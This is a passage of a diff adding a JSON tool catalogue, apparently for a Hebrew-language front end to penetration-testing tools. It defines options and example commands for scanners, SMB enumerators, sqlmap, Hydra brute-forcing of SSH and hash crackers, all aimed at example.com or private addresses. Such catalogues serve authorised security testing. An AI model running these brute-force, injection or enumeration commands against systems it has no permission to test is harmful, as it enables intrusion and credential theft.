@@ -1,0 +1,773 @@
+{
+  "categories": [
+    { "id": "recon",    "name": "איסוף מידע / Recon",        "icon": "🔍" },
+    { "id": "dns",      "name": "DNS",                        "icon": "🌐" },
+    { "id": "netscan",  "name": "סריקת רשת / Network",         "icon": "📡" },
+    { "id": "web",      "name": "אפליקציות ווב / Web",         "icon": "🕸️" },
+    { "id": "smb",      "name": "SMB / Enumeration",          "icon": "🗂️" },
+    { "id": "passwords","name": "סיסמאות / Password Attacks", "icon": "🔑" },
+    { "id": "ssl",      "name": "SSL / TLS",                  "icon": "🔒" },
+    { "id": "exploit",  "name": "ניצול / Exploitation",        "icon": "💥" },
+    { "id": "forensics","name": "פורנזיקה / Forensics",         "icon": "🔬" },
+    { "id": "wireless", "name": "אלחוטי / Wireless",            "icon": "📶" },
+    { "id": "util",     "name": "כלי עזר / Utilities",         "icon": "🛠️" }
+  ],
+  "tools": [
+    {
+      "id": "nmap", "name": "Nmap", "binary": "nmap", "package": "nmap", "category": "netscan",
+      "desc": "סורק פורטים ורשת — הכלי המרכזי למיפוי מארחים, פורטים, שירותים וגרסאות.",
+      "options": [
+        { "id": "scan", "flag": "", "label": "סוג סריקה", "type": "select", "help": "טכניקת הסריקה",
+          "choices": [ {"v":"","t":"ברירת מחדל"}, {"v":"-sS","t":"-sS SYN (מהיר, דורש root)"}, {"v":"-sT","t":"-sT TCP connect"}, {"v":"-sU","t":"-sU UDP"}, {"v":"-sn","t":"-sn Ping sweep (ללא פורטים)"}, {"v":"-sA","t":"-sA ACK"} ] },
+        { "id": "ports", "flag": "-p", "label": "פורטים", "type": "text", "placeholder": "22,80,443 או 1-1000 או -", "help": "-p — רשימה/טווח. '-' לכל 65535" },
+        { "id": "topports", "flag": "--top-ports", "label": "Top N פורטים", "type": "number", "placeholder": "100" },
+        { "id": "sv", "flag": "-sV", "label": "זיהוי גרסאות שירות (-sV)", "type": "bool" },
+        { "id": "os", "flag": "-O", "label": "זיהוי מערכת הפעלה (-O, דורש root)", "type": "bool" },
+        { "id": "aggr", "flag": "-A", "label": "סריקה אגרסיבית (-A: OS+גרסאות+סקריפטים)", "type": "bool" },
+        { "id": "sc", "flag": "-sC", "label": "סקריפטים ברירת מחדל (-sC)", "type": "bool" },
+        { "id": "scripts", "flag": "--script", "label": "NSE Scripts", "type": "text", "placeholder": "vuln, http-title, ssl-enum-ciphers", "help": "שמות סקריפטים מופרדים בפסיק" },
+        { "id": "timing", "flag": "", "label": "מהירות (Timing)", "type": "select",
+          "choices": [ {"v":"","t":"ברירת מחדל"}, {"v":"-T2","t":"-T2 מנומס"}, {"v":"-T3","t":"-T3 רגיל"}, {"v":"-T4","t":"-T4 מהיר"}, {"v":"-T5","t":"-T5 מטורף"} ] },
+        { "id": "Pn", "flag": "-Pn", "label": "דלג על Ping (-Pn: התייחס כמחובר)", "type": "bool" },
+        { "id": "v", "flag": "-v", "label": "פלט מפורט (-v)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "מטרה (Target)", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.0/24 או example.com", "help": "IP / טווח CIDR / דומיין" }
+      ],
+      "examples": [ "nmap -sV -T4 -p 1-1000 192.168.1.10", "nmap -sn 192.168.1.0/24" ]
+    },
+    {
+      "id": "masscan", "name": "Masscan", "binary": "masscan", "package": "masscan", "category": "netscan",
+      "desc": "סורק פורטים במהירות אדירה — כל האינטרנט בדקות. דורש root.",
+      "options": [
+        { "id": "ports", "flag": "-p", "label": "פורטים", "type": "text", "required": true, "placeholder": "0-65535 או 80,443", "primary": false },
+        { "id": "rate", "flag": "--rate", "label": "קצב (חבילות לשנייה)", "type": "number", "placeholder": "1000", "default": "1000" },
+        { "id": "banners", "flag": "--banners", "label": "לכידת Banners", "type": "bool" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "10.0.0.0/8" }
+      ],
+      "examples": [ "masscan -p80,443 --rate 1000 10.0.0.0/24" ]
+    },
+    {
+      "id": "netdiscover", "name": "Netdiscover", "binary": "netdiscover", "package": "netdiscover", "category": "netscan",
+      "desc": "גילוי מארחים חיים ברשת מקומית באמצעות ARP.",
+      "options": [
+        { "id": "range", "flag": "-r", "label": "טווח", "type": "text", "primary": true, "placeholder": "192.168.1.0/24" },
+        { "id": "iface", "flag": "-i", "label": "ממשק רשת", "type": "text", "placeholder": "eth0" },
+        { "id": "passive", "flag": "-p", "label": "מצב פסיבי (-p, ללא שליחה)", "type": "bool" }
+      ],
+      "examples": [ "netdiscover -r 192.168.1.0/24" ]
+    },
+    {
+      "id": "arp-scan", "name": "arp-scan", "binary": "arp-scan", "package": "arp-scan", "category": "netscan",
+      "desc": "סורק ARP מהיר לגילוי מכשירים ברשת המקומית + זיהוי יצרן.",
+      "options": [
+        { "id": "localnet", "flag": "--localnet", "label": "כל הרשת המקומית (--localnet)", "type": "bool" },
+        { "id": "iface", "flag": "-I", "label": "ממשק", "type": "text", "placeholder": "eth0" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "placeholder": "192.168.1.0/24" }
+      ],
+      "examples": [ "arp-scan --localnet", "arp-scan 192.168.1.0/24" ]
+    },
+    {
+      "id": "nbtscan", "name": "nbtscan", "binary": "nbtscan", "package": "nbtscan", "category": "smb",
+      "desc": "סריקת NetBIOS לגילוי שמות מחשבים ושיתופים ברשת.",
+      "options": [
+        { "id": "verbose", "flag": "-v", "label": "מפורט (-v)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.0/24" }
+      ],
+      "examples": [ "nbtscan 192.168.1.0/24" ]
+    },
+    {
+      "id": "whois", "name": "whois", "binary": "whois", "package": "whois", "category": "recon",
+      "desc": "שאילתת רישום דומיין / IP — בעלות, תאריכים, שרתי שמות.",
+      "options": [
+        { "id": "target", "flag": "", "label": "דומיין / IP", "type": "text", "primary": true, "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "whois example.com" ]
+    },
+    {
+      "id": "whatweb", "name": "WhatWeb", "binary": "whatweb", "package": "whatweb", "category": "web",
+      "desc": "טביעת אצבע של אתרים — טכנולוגיות, CMS, שרתים, גרסאות.",
+      "options": [
+        { "id": "aggr", "flag": "-a", "label": "רמת אגרסיביות", "type": "select",
+          "choices": [ {"v":"","t":"ברירת מחדל"}, {"v":"1","t":"1 Stealthy"}, {"v":"3","t":"3 Aggressive"}, {"v":"4","t":"4 Heavy"} ] },
+        { "id": "v", "flag": "-v", "label": "מפורט (-v)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "URL", "type": "text", "primary": true, "required": true, "placeholder": "https://example.com" }
+      ],
+      "examples": [ "whatweb -a 3 https://example.com" ]
+    },
+    {
+      "id": "wafw00f", "name": "wafw00f", "binary": "wafw00f", "package": "wafw00f", "category": "web",
+      "desc": "מזהה האם וכיצד אתר מוגן ע\"י Web Application Firewall.",
+      "options": [
+        { "id": "findall", "flag": "-a", "label": "בדוק את כל ה-WAFs (-a)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "URL", "type": "text", "primary": true, "required": true, "placeholder": "https://example.com" }
+      ],
+      "examples": [ "wafw00f https://example.com" ]
+    },
+    {
+      "id": "dig", "name": "dig", "binary": "dig", "package": "dnsutils", "category": "dns",
+      "desc": "שאילתות DNS מפורטות — רשומות A, MX, TXT, NS ועוד.",
+      "options": [
+        { "id": "type", "flag": "", "label": "סוג רשומה", "type": "select",
+          "choices": [ {"v":"","t":"A (ברירת מחדל)"}, {"v":"ANY","t":"ANY"}, {"v":"MX","t":"MX"}, {"v":"NS","t":"NS"}, {"v":"TXT","t":"TXT"}, {"v":"AAAA","t":"AAAA"}, {"v":"SOA","t":"SOA"}, {"v":"CNAME","t":"CNAME"} ] },
+        { "id": "short", "flag": "+short", "label": "פלט מקוצר (+short)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "דומיין", "type": "text", "primary": true, "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "dig example.com MX +short" ]
+    },
+    {
+      "id": "dnsenum", "name": "dnsenum", "binary": "dnsenum", "package": "dnsenum", "category": "dns",
+      "desc": "אנומרציית DNS — תת-דומיינים, MX, העברת אזור (zone transfer), brute-force.",
+      "options": [
+        { "id": "noreverse", "flag": "--noreverse", "label": "ללא reverse lookup", "type": "bool" },
+        { "id": "threads", "flag": "--threads", "label": "Threads", "type": "number", "placeholder": "5" },
+        { "id": "target", "flag": "", "label": "דומיין", "type": "text", "primary": true, "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "dnsenum example.com" ]
+    },
+    {
+      "id": "dnsrecon", "name": "dnsrecon", "binary": "dnsrecon", "package": "dnsrecon", "category": "dns",
+      "desc": "כלי איסוף DNS מתקדם — enumeration, zone transfer, brute force.",
+      "options": [
+        { "id": "domain", "flag": "-d", "label": "דומיין", "type": "text", "required": true, "placeholder": "example.com" },
+        { "id": "type", "flag": "-t", "label": "סוג בדיקה", "type": "select",
+          "choices": [ {"v":"","t":"std (ברירת מחדל)"}, {"v":"std","t":"std"}, {"v":"axfr","t":"axfr (zone transfer)"}, {"v":"brt","t":"brt (brute force)"}, {"v":"srv","t":"srv"} ] }
+      ],
+      "examples": [ "dnsrecon -d example.com -t std" ]
+    },
+    {
+      "id": "fierce", "name": "fierce", "binary": "fierce", "package": "fierce", "category": "dns",
+      "desc": "סורק DNS למציאת תת-דומיינים ומרחבי IP לא רציפים.",
+      "options": [
+        { "id": "domain", "flag": "--domain", "label": "דומיין", "type": "text", "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "fierce --domain example.com" ]
+    },
+    {
+      "id": "theharvester", "name": "theHarvester", "binary": "theHarvester", "package": "theharvester", "category": "recon",
+      "desc": "OSINT — איסוף אימיילים, תת-דומיינים, שמות ומארחים ממקורות ציבוריים.",
+      "options": [
+        { "id": "domain", "flag": "-d", "label": "דומיין", "type": "text", "required": true, "placeholder": "example.com" },
+        { "id": "limit", "flag": "-l", "label": "מגבלת תוצאות", "type": "number", "placeholder": "500" },
+        { "id": "source", "flag": "-b", "label": "מקור", "type": "select", "required": true,
+          "choices": [ {"v":"bing","t":"bing"}, {"v":"duckduckgo","t":"duckduckgo"}, {"v":"crtsh","t":"crtsh"}, {"v":"anubis","t":"anubis"}, {"v":"all","t":"all"} ] }
+      ],
+      "examples": [ "theHarvester -d example.com -b bing" ]
+    },
+    {
+      "id": "nikto", "name": "Nikto", "binary": "nikto", "package": "nikto", "category": "web",
+      "desc": "סורק חולשות בשרתי ווב — קבצים מסוכנים, גרסאות ישנות, בעיות תצורה.",
+      "options": [
+        { "id": "host", "flag": "-h", "label": "מטרה (host/URL)", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "port", "flag": "-p", "label": "פורט", "type": "number", "placeholder": "443" },
+        { "id": "ssl", "flag": "-ssl", "label": "כפה SSL (-ssl)", "type": "bool" },
+        { "id": "tuning", "flag": "-Tuning", "label": "כוונון בדיקות (Tuning)", "type": "text", "placeholder": "1234", "help": "1=קבצים 2=misconfig 3=info disclosure 9=SQLi" }
+      ],
+      "examples": [ "nikto -h https://example.com" ]
+    },
+    {
+      "id": "gobuster", "name": "Gobuster", "binary": "gobuster", "package": "gobuster", "category": "web",
+      "desc": "Brute-force של תיקיות/קבצים, תת-דומיינים ו-vhosts.",
+      "options": [
+        { "id": "mode", "flag": "", "label": "מצב", "type": "select", "required": true,
+          "choices": [ {"v":"dir","t":"dir (תיקיות/קבצים)"}, {"v":"dns","t":"dns (תת-דומיינים)"}, {"v":"vhost","t":"vhost"} ] },
+        { "id": "url", "flag": "-u", "label": "URL / דומיין", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "wordlist", "flag": "-w", "label": "Wordlist", "type": "text", "required": true, "placeholder": "/usr/share/wordlists/dirb/common.txt", "default": "/usr/share/wordlists/dirb/common.txt" },
+        { "id": "ext", "flag": "-x", "label": "סיומות קבצים", "type": "text", "placeholder": "php,html,txt" },
+        { "id": "threads", "flag": "-t", "label": "Threads", "type": "number", "placeholder": "10" },
+        { "id": "statuscodes", "flag": "-s", "label": "קודי סטטוס", "type": "text", "placeholder": "200,204,301,302" }
+      ],
+      "examples": [ "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt" ]
+    },
+    {
+      "id": "dirb", "name": "Dirb", "binary": "dirb", "package": "dirb", "category": "web",
+      "desc": "סורק תוכן ווב קלאסי — מגלה תיקיות וקבצים נסתרים.",
+      "options": [
+        { "id": "url", "flag": "", "label": "URL", "type": "text", "primary": true, "required": true, "placeholder": "https://example.com" },
+        { "id": "wordlist", "flag": "", "label": "Wordlist", "type": "text", "placeholder": "/usr/share/wordlists/dirb/common.txt" }
+      ],
+      "examples": [ "dirb https://example.com /usr/share/wordlists/dirb/common.txt" ]
+    },
+    {
+      "id": "ffuf", "name": "ffuf", "binary": "ffuf", "package": "ffuf", "category": "web",
+      "desc": "Fuzzer ווב מהיר — תיקיות, פרמטרים, vhosts. FUZZ מסמן את נקודת ההזרקה.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL (עם FUZZ)", "type": "text", "required": true, "placeholder": "https://example.com/FUZZ" },
+        { "id": "wordlist", "flag": "-w", "label": "Wordlist", "type": "text", "required": true, "default": "/usr/share/wordlists/dirb/common.txt" },
+        { "id": "mc", "flag": "-mc", "label": "התאם קודי סטטוס", "type": "text", "placeholder": "200,301,302" },
+        { "id": "fc", "flag": "-fc", "label": "סנן קודי סטטוס", "type": "text", "placeholder": "404" },
+        { "id": "threads", "flag": "-t", "label": "Threads", "type": "number", "placeholder": "40" }
+      ],
+      "examples": [ "ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt" ]
+    },
+    {
+      "id": "feroxbuster", "name": "feroxbuster", "binary": "feroxbuster", "package": "feroxbuster", "category": "web",
+      "desc": "סורק תוכן רקורסיבי ומהיר (Rust) לגילוי נתיבים.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "wordlist", "flag": "-w", "label": "Wordlist", "type": "text", "default": "/usr/share/wordlists/dirb/common.txt" },
+        { "id": "depth", "flag": "-d", "label": "עומק רקורסיה", "type": "number", "placeholder": "4" },
+        { "id": "ext", "flag": "-x", "label": "סיומות", "type": "text", "placeholder": "php,html" }
+      ],
+      "examples": [ "feroxbuster -u https://example.com" ]
+    },
+    {
+      "id": "wpscan", "name": "WPScan", "binary": "wpscan", "package": "wpscan", "category": "web",
+      "desc": "סורק אבטחה ל-WordPress — תוספים, ערכות נושא, משתמשים וחולשות.",
+      "options": [
+        { "id": "url", "flag": "--url", "label": "URL", "type": "text", "required": true, "placeholder": "https://blog.example.com" },
+        { "id": "enumerate", "flag": "-e", "label": "אנומרציה", "type": "select",
+          "choices": [ {"v":"","t":"ברירת מחדל"}, {"v":"vp","t":"vp תוספים פגיעים"}, {"v":"ap","t":"ap כל התוספים"}, {"v":"u","t":"u משתמשים"}, {"v":"vt","t":"vt ערכות פגיעות"} ] },
+        { "id": "random_ua", "flag": "--random-user-agent", "label": "User-Agent אקראי", "type": "bool" }
+      ],
+      "examples": [ "wpscan --url https://blog.example.com -e vp,u" ]
+    },
+    {
+      "id": "sqlmap", "name": "sqlmap", "binary": "sqlmap", "package": "sqlmap", "category": "web",
+      "desc": "כלי אוטומטי לזיהוי וניצול הזרקות SQL.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com/page.php?id=1" },
+        { "id": "batch", "flag": "--batch", "label": "מצב אוטומטי (--batch)", "type": "bool", "default": true },
+        { "id": "level", "flag": "--level", "label": "רמה (1-5)", "type": "number", "placeholder": "1" },
+        { "id": "risk", "flag": "--risk", "label": "סיכון (1-3)", "type": "number", "placeholder": "1" },
+        { "id": "dbs", "flag": "--dbs", "label": "רשימת מסדי נתונים (--dbs)", "type": "bool" },
+        { "id": "data", "flag": "--data", "label": "נתוני POST", "type": "text", "placeholder": "id=1&name=x" }
+      ],
+      "examples": [ "sqlmap -u 'https://example.com/page.php?id=1' --batch --dbs" ]
+    },
+    {
+      "id": "nuclei", "name": "Nuclei", "binary": "nuclei", "package": "nuclei", "category": "web",
+      "desc": "סורק חולשות מבוסס תבניות (templates) — מהיר וקהילתי.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "מטרה (URL)", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "severity", "flag": "-severity", "label": "חומרה", "type": "text", "placeholder": "critical,high,medium" },
+        { "id": "tags", "flag": "-tags", "label": "תגיות תבניות", "type": "text", "placeholder": "cve,exposure" }
+      ],
+      "examples": [ "nuclei -u https://example.com -severity critical,high" ]
+    },
+    {
+      "id": "smbclient", "name": "smbclient", "binary": "smbclient", "package": "smbclient", "category": "smb",
+      "desc": "לקוח SMB — רשימת שיתופים וגישה לקבצים בשרתי Windows/Samba.",
+      "options": [
+        { "id": "list", "flag": "-L", "label": "רשימת שיתופים (-L host)", "type": "text", "placeholder": "//192.168.1.10", "primary": true, "required": true },
+        { "id": "noauth", "flag": "-N", "label": "ללא סיסמה (-N)", "type": "bool", "default": true },
+        { "id": "user", "flag": "-U", "label": "משתמש", "type": "text", "placeholder": "guest" }
+      ],
+      "examples": [ "smbclient -L //192.168.1.10 -N" ]
+    },
+    {
+      "id": "smbmap", "name": "smbmap", "binary": "smbmap", "package": "smbmap", "category": "smb",
+      "desc": "אנומרציית שיתופי SMB והרשאות גישה.",
+      "options": [
+        { "id": "host", "flag": "-H", "label": "מארח", "type": "text", "required": true, "placeholder": "192.168.1.10" },
+        { "id": "user", "flag": "-u", "label": "משתמש", "type": "text", "placeholder": "guest" },
+        { "id": "pass", "flag": "-p", "label": "סיסמה", "type": "text", "placeholder": "''" }
+      ],
+      "examples": [ "smbmap -H 192.168.1.10" ]
+    },
+    {
+      "id": "enum4linux", "name": "enum4linux", "binary": "enum4linux", "package": "enum4linux", "category": "smb",
+      "desc": "אנומרציה מקיפה של מערכות Windows/Samba — משתמשים, שיתופים, קבוצות.",
+      "options": [
+        { "id": "all", "flag": "-a", "label": "כל הבדיקות (-a)", "type": "bool", "default": true },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "enum4linux -a 192.168.1.10" ]
+    },
+    {
+      "id": "hydra", "name": "Hydra", "binary": "hydra", "package": "hydra", "category": "passwords",
+      "desc": "כלי brute-force להתחברות לשירותים (SSH, FTP, HTTP, RDP ועוד).",
+      "options": [
+        { "id": "user", "flag": "-l", "label": "משתמש בודד", "type": "text", "placeholder": "admin" },
+        { "id": "userlist", "flag": "-L", "label": "רשימת משתמשים", "type": "text", "placeholder": "/path/users.txt" },
+        { "id": "pass", "flag": "-p", "label": "סיסמה בודדת", "type": "text" },
+        { "id": "passlist", "flag": "-P", "label": "רשימת סיסמאות", "type": "text", "placeholder": "/usr/share/wordlists/rockyou.txt" },
+        { "id": "threads", "flag": "-t", "label": "Threads", "type": "number", "placeholder": "16" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "ssh://192.168.1.10" }
+      ],
+      "examples": [ "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10" ]
+    },
+    {
+      "id": "john", "name": "John the Ripper", "binary": "john", "package": "john", "category": "passwords",
+      "desc": "כלי לפיצוח האשים של סיסמאות.",
+      "options": [
+        { "id": "wordlist", "flag": "--wordlist", "label": "Wordlist", "type": "text", "eq": true, "placeholder": "/usr/share/wordlists/rockyou.txt" },
+        { "id": "format", "flag": "--format", "label": "פורמט האש", "type": "text", "eq": true, "placeholder": "raw-md5, sha512crypt" },
+        { "id": "show", "flag": "--show", "label": "הצג סיסמאות שפוצחו (--show)", "type": "bool" },
+        { "id": "file", "flag": "", "label": "קובץ האשים", "type": "text", "primary": true, "required": true, "placeholder": "/path/hashes.txt" }
+      ],
+      "examples": [ "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" ]
+    },
+    {
+      "id": "hashcat", "name": "Hashcat", "binary": "hashcat", "package": "hashcat", "category": "passwords",
+      "desc": "פיצוח האשים מואץ GPU — מהיר ורב-עוצמה.",
+      "options": [
+        { "id": "mode", "flag": "-m", "label": "מצב האש (-m)", "type": "text", "required": true, "placeholder": "0=MD5 100=SHA1 1800=sha512crypt" },
+        { "id": "attack", "flag": "-a", "label": "מצב תקיפה (-a)", "type": "select",
+          "choices": [ {"v":"0","t":"0 Wordlist"}, {"v":"3","t":"3 Brute-force/Mask"}, {"v":"6","t":"6 Hybrid"} ] },
+        { "id": "file", "flag": "", "label": "קובץ האשים", "type": "text", "primary": true, "required": true, "placeholder": "/path/hashes.txt" },
+        { "id": "wordlist", "flag": "", "label": "Wordlist / Mask", "type": "text", "placeholder": "/usr/share/wordlists/rockyou.txt" }
+      ],
+      "examples": [ "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt" ]
+    },
+    {
+      "id": "sslscan", "name": "sslscan", "binary": "sslscan", "package": "sslscan", "category": "ssl",
+      "desc": "בדיקת תצורת SSL/TLS — פרוטוקולים, ציפרים וחולשות.",
+      "options": [
+        { "id": "target", "flag": "", "label": "מטרה host:port", "type": "text", "primary": true, "required": true, "placeholder": "example.com:443" }
+      ],
+      "examples": [ "sslscan example.com:443" ]
+    },
+    {
+      "id": "sslyze", "name": "SSLyze", "binary": "sslyze", "package": "sslyze", "category": "ssl",
+      "desc": "ניתוח מעמיק של תצורת SSL/TLS ושרתים.",
+      "options": [
+        { "id": "target", "flag": "", "label": "מטרה host:port", "type": "text", "primary": true, "required": true, "placeholder": "example.com:443" }
+      ],
+      "examples": [ "sslyze example.com:443" ]
+    },
+    {
+      "id": "ping", "name": "ping", "binary": "ping", "package": "iputils-ping", "category": "util",
+      "desc": "בדיקת קישוריות בסיסית למארח.",
+      "options": [
+        { "id": "count", "flag": "-c", "label": "מספר חבילות", "type": "number", "default": "4", "placeholder": "4" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "8.8.8.8" }
+      ],
+      "examples": [ "ping -c 4 8.8.8.8" ]
+    },
+    {
+      "id": "curl", "name": "curl", "binary": "curl", "package": "curl", "category": "util",
+      "desc": "לקוח HTTP — שליחת בקשות, בדיקת כותרות, הורדת תוכן.",
+      "options": [
+        { "id": "head", "flag": "-I", "label": "כותרות בלבד (-I)", "type": "bool" },
+        { "id": "verbose", "flag": "-v", "label": "מפורט (-v)", "type": "bool" },
+        { "id": "method", "flag": "-X", "label": "מתודה", "type": "select",
+          "choices": [ {"v":"","t":"GET (ברירת מחדל)"}, {"v":"POST","t":"POST"}, {"v":"PUT","t":"PUT"}, {"v":"DELETE","t":"DELETE"}, {"v":"HEAD","t":"HEAD"} ] },
+        { "id": "insecure", "flag": "-k", "label": "התעלם מ-SSL (-k)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "URL", "type": "text", "primary": true, "required": true, "placeholder": "https://example.com" }
+      ],
+      "examples": [ "curl -I https://example.com" ]
+    },
+    {
+      "id": "traceroute", "name": "traceroute", "binary": "traceroute", "package": "traceroute", "category": "util",
+      "desc": "מעקב אחר הנתיב (hops) אל מארח יעד.",
+      "options": [
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "traceroute example.com" ]
+    },
+    {
+      "id": "subfinder", "name": "Subfinder", "binary": "subfinder", "package": "subfinder", "category": "recon",
+      "desc": "גילוי תת-דומיינים מהיר ופסיבי (ProjectDiscovery) ממקורות מרובים.",
+      "options": [
+        { "id": "domain", "flag": "-d", "label": "דומיין", "type": "text", "required": true, "placeholder": "example.com" },
+        { "id": "all", "flag": "-all", "label": "כל המקורות (-all)", "type": "bool" },
+        { "id": "silent", "flag": "-silent", "label": "פלט נקי בלבד (-silent)", "type": "bool", "default": true },
+        { "id": "recursive", "flag": "-recursive", "label": "רקורסיבי", "type": "bool" }
+      ],
+      "examples": [ "subfinder -d example.com -silent" ]
+    },
+    {
+      "id": "sublist3r", "name": "Sublist3r", "binary": "sublist3r", "package": "sublist3r", "category": "recon",
+      "desc": "מונה תת-דומיינים באמצעות מנועי חיפוש ומקורות OSINT.",
+      "options": [
+        { "id": "domain", "flag": "-d", "label": "דומיין", "type": "text", "required": true, "placeholder": "example.com" },
+        { "id": "threads", "flag": "-t", "label": "Threads", "type": "number", "placeholder": "10" },
+        { "id": "ports", "flag": "-p", "label": "בדוק פורטים", "type": "text", "placeholder": "80,443" },
+        { "id": "v", "flag": "-v", "label": "מפורט (-v)", "type": "bool" }
+      ],
+      "examples": [ "sublist3r -d example.com" ]
+    },
+    {
+      "id": "assetfinder", "name": "assetfinder", "binary": "assetfinder", "package": "assetfinder", "category": "recon",
+      "desc": "מוצא דומיינים ותת-דומיינים הקשורים למטרה — מהיר וקליל.",
+      "options": [
+        { "id": "subsonly", "flag": "--subs-only", "label": "רק תת-דומיינים (--subs-only)", "type": "bool", "default": true },
+        { "id": "target", "flag": "", "label": "דומיין", "type": "text", "primary": true, "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "assetfinder --subs-only example.com" ]
+    },
+    {
+      "id": "dmitry", "name": "DMitry", "binary": "dmitry", "package": "dmitry", "category": "recon",
+      "desc": "איסוף מידע — whois, Netcraft, תת-דומיינים, אימיילים וסריקת פורטים.",
+      "options": [
+        { "id": "whois", "flag": "-w", "label": "Whois (-w)", "type": "bool", "default": true },
+        { "id": "netcraft", "flag": "-n", "label": "Netcraft (-n)", "type": "bool" },
+        { "id": "subs", "flag": "-s", "label": "תת-דומיינים (-s)", "type": "bool" },
+        { "id": "emails", "flag": "-e", "label": "אימיילים (-e)", "type": "bool" },
+        { "id": "ports", "flag": "-p", "label": "סריקת פורטים (-p)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "example.com" }
+      ],
+      "examples": [ "dmitry -wnse example.com" ]
+    },
+    {
+      "id": "sherlock", "name": "Sherlock", "binary": "sherlock", "package": "sherlock", "category": "recon",
+      "desc": "מאתר חשבונות של שם משתמש ברשתות חברתיות רבות.",
+      "options": [
+        { "id": "timeout", "flag": "--timeout", "label": "Timeout (שניות)", "type": "number", "placeholder": "60" },
+        { "id": "user", "flag": "", "label": "שם משתמש", "type": "text", "primary": true, "required": true, "placeholder": "johndoe" }
+      ],
+      "examples": [ "sherlock johndoe" ]
+    },
+    {
+      "id": "httpx", "name": "httpx", "binary": "httpx", "package": "httpx-toolkit", "category": "web",
+      "desc": "בדיקת שרתי HTTP — סטטוס, כותרות, טכנולוגיות וגילוי אתרים חיים.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "מטרה (URL)", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "title", "flag": "-title", "label": "כותרת עמוד (-title)", "type": "bool", "default": true },
+        { "id": "sc", "flag": "-status-code", "label": "קוד סטטוס", "type": "bool", "default": true },
+        { "id": "td", "flag": "-tech-detect", "label": "זיהוי טכנולוגיות", "type": "bool", "default": true },
+        { "id": "server", "flag": "-web-server", "label": "זיהוי שרת", "type": "bool" }
+      ],
+      "examples": [ "httpx -u https://example.com -title -status-code -tech-detect" ]
+    },
+    {
+      "id": "wfuzz", "name": "Wfuzz", "binary": "wfuzz", "package": "wfuzz", "category": "web",
+      "desc": "Fuzzer ווב — מגלה משאבים, פרמטרים וחולשות. FUZZ מסמן נקודת הזרקה.",
+      "options": [
+        { "id": "payload", "flag": "-z", "label": "Payload", "type": "text", "required": true, "default": "file,/usr/share/wordlists/dirb/common.txt", "help": "לרוב: file,<נתיב-wordlist>" },
+        { "id": "hc", "flag": "--hc", "label": "הסתר קודי סטטוס", "type": "text", "placeholder": "404" },
+        { "id": "color", "flag": "-c", "label": "צבע (-c)", "type": "bool", "default": true },
+        { "id": "url", "flag": "", "label": "URL (עם FUZZ)", "type": "text", "primary": true, "required": true, "placeholder": "http://example.com/FUZZ" }
+      ],
+      "examples": [ "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://example.com/FUZZ" ]
+    },
+    {
+      "id": "dirsearch", "name": "dirsearch", "binary": "dirsearch", "package": "dirsearch", "category": "web",
+      "desc": "סורק נתיבים/קבצים בשרתי ווב, עם תמיכה בסיומות ורקורסיה.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "ext", "flag": "-e", "label": "סיומות", "type": "text", "placeholder": "php,html,js" },
+        { "id": "exclude", "flag": "-x", "label": "החרג קודי סטטוס", "type": "text", "placeholder": "403,404" },
+        { "id": "wordlist", "flag": "-w", "label": "Wordlist", "type": "text", "placeholder": "/usr/share/wordlists/dirb/common.txt" },
+        { "id": "recursive", "flag": "-r", "label": "רקורסיבי (-r)", "type": "bool" }
+      ],
+      "examples": [ "dirsearch -u https://example.com -e php,html" ]
+    },
+    {
+      "id": "wapiti", "name": "Wapiti", "binary": "wapiti", "package": "wapiti", "category": "web",
+      "desc": "סורק חולשות אפליקציות ווב — SQLi, XSS, LFI, הזרקות ועוד.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "modules", "flag": "-m", "label": "מודולים", "type": "text", "placeholder": "sql,xss,exec" },
+        { "id": "flush", "flag": "--flush-session", "label": "אפס סשן קודם", "type": "bool" }
+      ],
+      "examples": [ "wapiti -u https://example.com" ]
+    },
+    {
